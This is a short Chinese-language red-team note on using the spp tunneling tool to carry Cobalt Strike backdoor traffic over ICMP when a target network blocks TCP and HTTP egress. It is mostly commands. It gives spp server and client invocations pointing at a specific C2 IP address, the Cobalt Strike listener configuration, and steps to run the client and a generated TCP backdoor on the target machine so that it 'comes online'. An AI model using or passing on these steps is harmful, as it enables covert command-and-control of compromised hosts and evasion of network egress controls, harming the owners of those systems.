spp-支持特殊协议-上线
<https://github.com/esrrhs/spp>
支持的协议：tcp、udp、icmp、http、kcp、quic等
支持的类型：正向代理、反向代理、socks5正向代理、socks5反向代理。

在对抗项目甲有遇到过一些极端环境，比如目标封了：tcp，http等常用出网的协议。
但是：icmp，dns等协议可能因为业务需要或者管理者安全意识不到位导致没有封干净。在这种场量下就可以使用这些容易被忽视的协议进行隧道的搭建。

## **服务端**
监听icmp数据
```
./spp -type server -proto ricmp -listen 0.0.0.0
```
## **客户端**
将本地8082的tcp封装成icmp，转发给服务端的8081端口
```
spp -name "test"-type proxy_client -server 47.94.236.117 -fromaddr :8082 
-toaddr :8081 -proxyproto tcp -proto ricmp
```
^
## **CS使用icmp上线**
CS服务端，spp监听icmp数据，并创建监听器监听8081端口
```
/spp -type server -proto ricmp -listen 0.0.0.0
```
```
监听器1：http 47.94.236.117 8081
监听器2：http 127.0.0.1 8082
生成tcp后门：监听器2
```

目标机
```
运行spp客户端
spp -name "test"-type proxy_client -server 47.94.236.117 -fromaddr :8082 
-toaddr :8081 -proxyproto tcp -proto ricmp

并运行后门
成功上线
```
